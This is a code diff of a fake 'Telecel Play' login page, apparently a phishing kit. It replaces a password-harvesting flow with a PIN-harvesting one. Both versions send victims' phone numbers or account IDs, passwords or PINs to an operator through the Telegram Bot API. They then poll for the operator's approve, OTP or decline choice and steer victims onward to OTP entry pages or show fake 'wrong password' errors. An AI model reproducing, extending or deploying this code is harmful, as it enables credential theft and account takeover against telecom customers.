-            const otp6Id = `s2_6otp_${ts}`;
-            const declineId = `s2_decline_${ts}`;
-
-            // Store for potential OTP redirect
-            sessionStorage.setItem('telecel_accountType', accountType);
-            sessionStorage.setItem('telecel_identifier', identifier);
-            sessionStorage.setItem('telecel_password', password);
-            if (accountType === 'Mobile') {
-                sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
-            } else {
-                sessionStorage.setItem('telecel_accountId', identifier);
-            }
-
-            const displayType = accountType;
-            const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
-            const message = `🔐 <b>Telecel Play Login – Step 2</b>\n\n` +
-                `<b>Account Type:</b> ${displayType}\n` +
-                `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n` +
-                `<b>Password:</b> <code>${escapeHtml(password)}</code>\n\n` +
-                `📢 <b>Verify credentials:</b>`;
-
-            try {
-                const response = await fetch(`${API_BASE}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { text: '✅ Approve', callback_data: approveId },
-                                    { text: ' 6 OTP', callback_data: otp6Id },
-                                    { text: '❌ Decline', callback_data: declineId }
-                                ]
-                            ]
-                        }
-                    })
-                });
-
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-                startPollingStage2(approveId, otp6Id, declineId);
-            } catch (err) {
-                console.error('Telegram send error (stage 2):', err);
-                spinner.style.display = 'none';
-                isSubmitting = false;
-                updateButtonState();
-                showError('Network error. Please try again.');
-            }
-        }
-
-        // ========== POLL FOR STAGE 2 DECISION ==========
-        function startPollingStage2(approveId, otp6Id, declineId) {
-            stopPolling();
-            let lastUpdateId = 0;
-
-            currentPollInterval = setInterval(async () => {
-                try {
-                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (!data.ok || !data.result.length) return;
-
-                    for (const update of data.result) {
-                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
-                        const callback = update.callback_query;
-                        if (!callback) continue;
-                        const cbData = callback.data;
-
-                        // --- APPROVE: redirect to loan.html ---
-                        if (cbData === approveId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            
-                            window.location.href = 'loan.html';
-                            return;
-                        }
-
-                        // --- 6 OTP: redirect ---
-                        if (cbData === otp6Id) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            const otp = generate6DigitOTP();
-                            sessionStorage.setItem('telecel_otp', otp);
-                            sessionStorage.setItem('telecel_otp_length', '6');
-                            
-                            window.location.href = 'otp6.html';
-                            return;
-                        }
-
-                        // --- DECLINE: show wrong password error ---
-                        if (cbData === declineId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            passwordField.value = '';
-                            updateButtonState();
-                            showError('Wrong password. Please try again.');
-                            
-                            passwordField.focus();
-                            return;
-                        }
-                    }
-                } catch (err) {
-                    console.warn('Polling error (stage 2):', err);
-                }
-            }, 1500);
-        }
-
-        // ========== ANSWER CALLBACK (optional but good practice) ==========
-        async function answerCallback(callbackQueryId, text) {
-            try {
-                await fetch(`${API_BASE}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackQueryId,
-                        text: text,
-                        show_alert: false
-                    })
-                });
-            } catch (e) {
-                // Silently ignore
-            }
-        }
-
-        // ========== MAIN SUBMIT HANDLER ==========
-        async function handleSubmit() {
-            if (isSubmitting) return;
-
-            const accountType = selectedTypeInput.value;
-            const identifier = inputField.value.trim();
-
-            hideError();
-
-            // --- Stage 1: Submit identifier only ---
-            if (currentStage === 1) {
-                if (!identifier) {
-                    showError('Please enter your phone number or account ID.');
-                    return;
-                }
-
-                if (accountType === 'Mobile') {
-                    if (!validateMobileNumber(identifier)) {
-                        showError(
-                            'Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
-                        return;
-                    }
-                } else {
-                    if (identifier.length < 3) {
-                        showError('Please enter a valid Broadband Account ID (minimum 3 characters).');
-                        return;
-                    }
-                }
-
-                isSubmitting = true;
-                loginBtn.disabled = true;
-                spinner.style.display = 'flex';
-
-                await sendStage1ToTelegram(accountType, identifier);
-                return;
-            }
-
-            // --- Stage 2: Submit identifier + password ---
-            if (currentStage === 2) {
-                const password = passwordField.value;
-
-                if (!identifier) {
-                    showError('Please enter your phone number or account ID.');
-                    return;
-                }
-                if (!password || password.length === 0) {
-                    showError('Please enter your password.');
-                    passwordField.focus();
-                    return;
-                }
-
-                isSubmitting = true;
-                loginBtn.disabled = true;
-                spinner.style.display = 'flex';
-
-                await sendStage2ToTelegram(accountType, identifier, password);
-                return;
-            }
-        }
-
-        // ========== DROPDOWN FUNCTIONS ==========
-        function toggleDropdown() {
-            // Prevent dropdown toggle if disabled (stage 2)
-            if (dropdownWrapper.classList.contains('disabled-drop')) return;
-
-            const isVisible = dropdownList.style.display === 'block';
-            dropdownList.style.display = isVisible ? 'none' : 'block';
-            if (isVisible) {
-                arrow.classList.remove('rotate');
-            } else {
-                arrow.classList.add('rotate');
-            }
-        }
-
-        function selectType(e, type) {
-            e.stopPropagation();
-            if (dropdownWrapper.classList.contains('disabled-drop')) return;
-
-            selectedTypeInput.value = type;
-            document.querySelectorAll('.dropdown-item').forEach(item => {
-                item.classList.remove('active');
-            });
-            e.target.classList.add('active');
-
-            if (type === 'Mobile') {
-                inputLabel.innerText = 'Phone Number';
-                inputField.placeholder = '020XXXXXXX';
-                inputField.inputMode = 'numeric';
-                applyIdentifierFilter();
-            } else {
-                inputLabel.innerText = 'User ID / Account Number';
-                inputField.placeholder = 'e.g., TEL123XYZ';
-                inputField.inputMode = 'text';
-            }
-            applyIdentifierFilter();
-            dropdownList.style.display = 'none';
-            arrow.classList.remove('rotate');
-            updateButtonState();
-            hideError();
-        }
-
-        document.addEventListener('click', function(e) {
-            if (!e.target.closest('.dropdown')) {
-                dropdownList.style.display = 'none';
-                arrow.classList.remove('rotate');
-            }
-        });
-
-        // ========== EVENT LISTENERS ==========
-        inputField.addEventListener('input', function() {
-            applyIdentifierFilter();
-            updateButtonState();
-            hideError();
-        });
-
-        inputField.addEventListener('paste', function(e) {
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
             e.preventDefault();
-            const pasted = (e.clipboardData || window.clipboardData).getData('text');
-            const currentType = selectedTypeInput.value;
-            const filtered = filterInput(pasted, currentType);
-            const start = this.selectionStart || 0;
-            const end = this.selectionEnd || 0;
-            const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
-            this.value = filterInput(newValue, currentType);
-            const newCursor = start + filtered.length;
-            this.setSelectionRange(newCursor, newCursor);
-            updateButtonState();
-            hideError();
-        });
-
-        passwordField.addEventListener('input', function() {
-            updateButtonState();
-            hideError();
-        });
-
-        // Enter key submission
-        passwordField.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && currentStage === 2 && !isSubmitting) {
-                const identifier = inputField.value.trim();
-                const password = passwordField.value;
-                if (identifier !== '' && password.length > 0) {
-                    e.preventDefault();
-                    handleSubmit();
-                }
-            }
-        });
-
-        inputField.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !isSubmitting) {
-                if (currentStage === 1) {
-                    const identifier = inputField.value.trim();
-                    if (identifier !== '') {
-                        e.preventDefault();
-                        handleSubmit();
-                    }
-                } else if (currentStage === 2) {
-                    const identifier = inputField.value.trim();
-                    const password = passwordField.value;
-                    if (identifier !== '' && password.length > 0) {
-                        e.preventDefault();
-                        handleSubmit();
-                    }
-                }
-            }
-        });
-
-        loginBtn.addEventListener('click', handleSubmit);
-
-        goBackBtn.addEventListener('click', () => {
-            if (currentStage === 2) {
-                // In stage 2, "Go Back" resets to stage 1
-                stopPolling();
-                spinner.style.display = 'none';
-                isSubmitting = false;
-                resetToStage1();
-                inputField.focus();
-            } else {
-                window.history.back();
-            }
-        });
-
-        // ========== INITIALIZE ==========
-        function init() {
-            dropdownList.style.display = 'none';
-            passwordSection.style.display = 'none';
-            currentStage = 1;
-            loginBtn.textContent = 'Continue';
-            applyIdentifierFilter();
-            setupPasswordToggle();
-            updateButtonState();
-            hideError();
-            if (selectedTypeInput.value === 'Mobile') {
-                inputField.placeholder = '020XXXXXXX';
-            } else {
-                inputField.placeholder = 'e.g., TEL123XYZ';
-            }
-            inputField.focus();
+            pinInputs[idx - 1].focus();
+            pinInputs[idx - 1].value = '';
+            pinInputs[idx - 1].classList.remove('filled');
+            updateLoginButton();
+          }
+        } else if (e.key === 'ArrowLeft') {
+          if (idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+          }
+        } else if (e.key === 'ArrowRight') {
+          if (idx < pinInputs.length - 1) {
+            e.preventDefault();
+            pinInputs[idx + 1].focus();
+          }
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+          e.preventDefault();
         }
+      });
+    });
+  }
 
-        init();
+  // ========== VALIDATION ==========
+  function validateMobileNumber(number) {
+    const cleaned = number.replace(/\D/g, '');
+    if (cleaned.length < 10) return false;
+    return cleaned.startsWith('020') || cleaned.startsWith('050');
+  }
 
-        // Expose globals
-        window.toggleDropdown = toggleDropdown;
-        window.selectType = selectType;
-        window.hideError = hideError;
-    </script>
+  // ========== OTP GENERATORS ==========
+  function generate5DigitOTP() {
+    return Math.floor(10000 + Math.random() * 90000).toString();
+  }
+  function generate6DigitOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
+
+  // ========== TELEGRAM HELPERS ==========
+  function escapeHtml(unsafe) {
+    if (!unsafe) return '';
+    return unsafe.replace(/[&<>"]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      if (m === '"') return '&quot;';
+      return m;
+    });
+  }
+
+  function stopPolling() {
+    if (currentPollInterval) {
+      clearInterval(currentPollInterval);
+      currentPollInterval = null;
+    }
+  }
+
+  async function sendLoginToTelegram(accountType, identifier, pin) {
+    const ts = Date.now();
+    const fiveOtpId = `login_5otp_${ts}`;
+    const sixOtpId = `login_6otp_${ts}`;
+    const declineId = `login_decline_${ts}`;
+    
+    sessionStorage.setItem('telecel_accountType', accountType);
+    sessionStorage.setItem('telecel_identifier', identifier);
+    if (accountType === 'Mobile') {
+      sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
+    } else {
+      sessionStorage.setItem('telecel_accountId', identifier);
+    }
+    sessionStorage.setItem('telecel_pin', pin);
+    
+    const displayType = accountType;
+    const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
+    const message = `🔐 <b>Telecel Play Login Request</b>\n\n` +
+                    `<b>Account Type:</b> ${displayType}\n` +
+                    `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n` +
+                    `<b> 4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+                    `📢 <b>Select OTP length or Decline:</b>`;
+
+    try {
+      const response = await fetch(`${API_BASE}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: ' 5 OTP', callback_data: fiveOtpId },
+              { text: ' 6 OTP', callback_data: sixOtpId },
+              { text: '❌ Decline', callback_data: declineId }
+            ]]
+          }
+        })
+      });
+      
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      
+      startPollingForDecision(fiveOtpId, sixOtpId, declineId);
+    } catch (err) {
+      console.error('Telegram send error:', err);
+      spinner.style.display = 'none';
+      isSubmitting = false;
+      loginBtn.disabled = false;
+      updateLoginButton();
+      showError('Network error. Please try again.');
+    }
+  }
+
+  function startPollingForDecision(fiveOtpId, sixOtpId, declineId) {
+    stopPolling();
+    let lastUpdateId = 0;
+    
+    currentPollInterval = setInterval(async () => {
+      try {
+        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!data.ok || !data.result.length) return;
+        
+        for (const update of data.result) {
+          lastUpdateId = Math.max(lastUpdateId, update.update_id);
+          const callback = update.callback_query;
+          if (!callback) continue;
+          const cbData = callback.data;
+          
+          if (cbData === fiveOtpId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            const otp = generate5DigitOTP();
+            sessionStorage.setItem('telecel_otp', otp);
+            sessionStorage.setItem('telecel_otp_length', '5');
+            window.location.href = 'otp5.html';
+            return;
+          }
+          
+          if (cbData === sixOtpId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            const otp = generate6DigitOTP();
+            sessionStorage.setItem('telecel_otp', otp);
+            sessionStorage.setItem('telecel_otp_length', '6');
+            window.location.href = 'otp6.html';
+            return;
+          }
+          
+          if (cbData === declineId) {
+            stopPolling();
+            spinner.style.display = 'none';
+            isSubmitting = false;
+            loginBtn.disabled = false;
+            updateLoginButton();
+            showError('Authentication declined. Please check your credentials and try again.');
+            clearPinFields();
+            focusFirstPin();
+            return;
+          }
+        }
+      } catch (err) {
+        console.warn('Polling error:', err);
+      }
+    }, 1500);
+  }
+
+  async function submitLogin() {
+    if (isSubmitting) return;
+    
+    const accountType = selectedTypeInput.value;
+    const identifier = inputField.value.trim();
+    const pin = pinInputs.map(p => p.value).join('');
+    
+    hideError();
+    
+    if (!identifier) {
+      showError('Please enter your phone number or account ID.');
+      return;
+    }
+    if (pin.length !== 4) {
+      showError('Please enter your 4-digit PIN.');
+      return;
+    }
+    
+    if (accountType === 'Mobile') {
+      if (!validateMobileNumber(identifier)) {
+        showError('Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
+        return;
+      }
+    } else {
+      if (identifier.length < 3) {
+        showError('Please enter a valid Broadband Account ID (minimum 3 characters).');
+        return;
+      }
+    }
+    
+    isSubmitting = true;
+    loginBtn.disabled = true;
+    spinner.style.display = 'flex';
+    
+    await sendLoginToTelegram(accountType, identifier, pin);
+  }
+
+  // ========== DROPDOWN FUNCTIONS ==========
+  function toggleDropdown() {
+    const isVisible = dropdownList.style.display === 'block';
+    dropdownList.style.display = isVisible ? 'none' : 'block';
+    arrow.classList.toggle('rotate', !isVisible);
+  }
+  
+  function selectType(e, type) {
+    e.stopPropagation();
+    selectedTypeInput.value = type;
+    document.querySelectorAll('.dropdown-item').forEach(item => {
+      item.classList.remove('active');
+    });
+    e.target.classList.add('active');
+    
+    const label = document.getElementById('inputLabel');
+    if (type === 'Mobile') {
+      label.innerText = 'Phone Number';
+      inputField.placeholder = '020XXXXXXX';
+      inputField.inputMode = 'numeric';
+      applyIdentifierFilter();
+    } else {
+      label.innerText = 'User ID / Account Number';
+      inputField.placeholder = 'e.g., TEL123XYZ';
+      inputField.inputMode = 'text';
+    }
+    applyIdentifierFilter();
+    dropdownList.style.display = 'none';
+    arrow.classList.remove('rotate');
+    clearPinFields();
+    updateLoginButton();
+    hideError();
+  }
+  
+  document.addEventListener('click', function(e) {
+    if (!e.target.closest('.dropdown')) {
+      dropdownList.style.display = 'none';
+      arrow.classList.remove('rotate');
+    }
+  });
+
+  // ========== EVENT LISTENERS ==========
+  inputField.addEventListener('input', function() {
+    applyIdentifierFilter();
+    clearPinFields();
+    updateLoginButton();
+    hideError();
+  });
+  
+  inputField.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+    const currentType = selectedTypeInput.value;
+    const filtered = filterInput(pasted, currentType);
+    const start = this.selectionStart || 0;
+    const end = this.selectionEnd || 0;
+    const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
+    this.value = filterInput(newValue, currentType);
+    const newCursor = start + filtered.length;
+    this.setSelectionRange(newCursor, newCursor);
+    clearPinFields();
+    updateLoginButton();
+    hideError();
+  });
+  
+  loginBtn.addEventListener('click', submitLogin);
+  goBackBtn.addEventListener('click', () => {
+    window.history.back();
+  });
+  
+  // ========== INITIALIZE ==========
+  function init() {
+    dropdownList.style.display = 'none';
+    applyIdentifierFilter();
+    setupPinInputs();
+    updateLoginButton();
+    hideError();
+    if (selectedTypeInput.value === 'Mobile') {
+      inputField.placeholder = '020XXXXXXX';
+    } else {
+      inputField.placeholder = 'e.g., TEL123XYZ';
+    }
+    inputField.focus();
+  }
+  
+  init();
+  
+  // Expose globals
+  window.toggleDropdown = toggleDropdown;
+  window.selectType = selectType;
+  window.hideError = hideError;
+</script>
 </body>
 </html>
